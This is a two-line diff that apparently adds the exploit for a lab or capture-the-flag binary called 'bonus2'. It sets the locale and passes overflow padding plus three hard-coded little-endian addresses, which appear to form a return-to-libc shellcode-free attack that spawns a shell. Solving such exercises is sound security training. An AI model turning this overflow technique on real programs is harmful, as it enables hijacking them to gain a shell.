@@ -1,0 +1,2 @@
+export LANG=fi
+./bonus2 `python -c 'print("a"*100)'` `python -c 'print("b"*18 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])'`
